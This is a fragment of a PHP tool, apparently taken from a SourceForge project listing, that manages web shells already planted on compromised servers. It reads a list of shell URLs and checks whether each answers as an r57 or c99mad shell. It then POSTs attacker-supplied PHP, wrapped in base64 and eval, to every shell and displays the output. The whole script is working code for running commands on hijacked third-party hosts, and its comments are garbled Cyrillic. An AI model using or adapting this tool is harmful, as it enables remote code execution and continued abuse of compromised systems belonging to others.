xtarea> <br> <input type=\"submit\" value = \"Eval\" style=\"color: #0303DA; border: 1px solid #800000; background-color: #000000\"> </form> <? set_time_limit (0);  ########################################## ################<FUNCTIONS>############### ########################################## function get_urls($shells) {      for($x = 0; $x<count($shells); $x++){         if( !strpos($shells[$x], \"http\") ){              $shells[$x] = \"http://\".$shells[$x];         } //&#241;&#235;&#243;&#247;&#224;&#232; &#287;&#224;&#231;&#237;&#251;&#229; &#225;&#251;&#226;&#224;&#351;&#242; =)     }          $shells = implode($shells); //&#226;&#241;&#184; &#226; &#238;&#228;&#237;&#243; &#241;&#242;&#287;&#238;&#247;&#234;&#243; =)     preg_match_all(\"/http:\\/\\/[A-Za-z0-9\\-_]+\\\\.+[A-Za-z0-9\\.\\/%&=\\?\\-_]+/\", $shells, $hosts); //&#228;&#184;&#287;&#227;&#224;&#229;&#236; &#243;&#287;&#235;&#251;     return $hosts[0]; }  function eval_code($url, $phpcode, $type) {     $res = \"\";     $phpcode = \"eval(base64_decode(\\\"\".base64_encode(\"echo \\\"~~~~~\\\"; \".$phpcode.\"die();\").\"\\\"));\";     $phpcode = str_replace('=','',$phpcode);     $evil = urlencode($phpcode);     $url = curl_init($url);     curl_setopt($url, CURLOPT_POST,1);     if ($type == \"r57shell\")     {     curl_setopt($url, CURLOPT_POSTFIELDS , \"php_eval={$evil}&dir=.&cmd=php_eval&submit=Execute\");     }     elseif ($type == \"madshell\")     {     curl_setopt($url, CURLOPT_POSTFIELDS , \"act=eval&eval={$evil}&d=.&eval_txt=1\");     }     else     {     return \"unknown shell\";     }          curl_setopt($url, CURLOPT_HEADER      ,0);       curl_setopt($url, CURLOPT_RETURNTRANSFER  ,1);      $res = explode(\"~~~~~\",curl_exec($url));     curl_close($url);     return($res[1]); }  function check_type ($url) {   $timeout = 10;   $t_ans=array('200','401','302');   $url = parse_url($url);   $host  = $url['host'];   $path  = $url['path'];   $query  = $url['query'];   $fsock = @fsockopen ($host,80,$err,$errstr,$timeout);   if ($fsock) {    $request  = \"GET \".$path.\"?\".$query.\" HTTP/1.1\\n\";    $request .= \"Host: \".$host.\"\\n\";    $request .= \"User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.8.0.2) Gecko/20060308 Firefox/1.5.0.2\\n\";    $request .= \"Connection: close\\n\";    $request .= \"Content-Type: application/x-www-form-urlencoded\\r\\n\\r\\n\";    fwrite    ($fsock,$request);    $responce = fread($fsock,4096);     fclose    ($fsock);    $ans    =    substr($responce,9,3);    if(!in_array($ans,$t_ans)) return \"Error answer type: {$ans}\";    $type = \"bad shell\\unknown\";    if (eregi(\"r57\",$responce)) $type = \"r57shell\";    if (eregi(\"c99mad\",$responce)) $type = \"madshell\";    return $type; } else {return \"Unable to connect to <b>{$host}</b>. Timeout is {$timeout}\";} }  ########################################## ###############</FUNCTIONS>############### ##########################################       $shell_array = get_urls($_POST['shells']);     echo \"<table align=\\\"center\\\" border=\\\"0\\\" cellpadding=\\\"0\\\" cellspacing=\\\"1\\\" >\"; //&#287;&#232;&#241;&#243;&#229;&#236; &#242;&#224;&#225;&#235;&#232;&#247;&#234;&#243;     foreach ($shell_array as $shell)     {         $type = check_type($shell);         $res_evil = eval_code($shell, $_POST['evil'], $type);         //if (($_POST['valid'] == 1) and ($type == \"Error answer type: 404\")) //&#242;&#238;&#235;&#252;&#234;&#238; &#248;&#229;&#235;&#235;&#251; &#232;&#235;&#232; &#247;&#242;&#238;-&#242;&#238; &#239;&#238;&#245;&#238;&#230;&#229;&#229;         //{             echo \"<tr> <td> <b><font color=white>{$shell} </font></b></td> <td> <font color=darkred><b>{$type}</b></font> </td> <td> <font color=darkorange><b>{$res_evil} </b></td> </tr>\";             flush();         //}     }     echo \"</table>\"; ?>"}, {"sourceforge_group_id": 1266998, "mount_point": "summary", "name": "summary", "label": "Summary"}, {"mount_point": "files", "name": "files", "l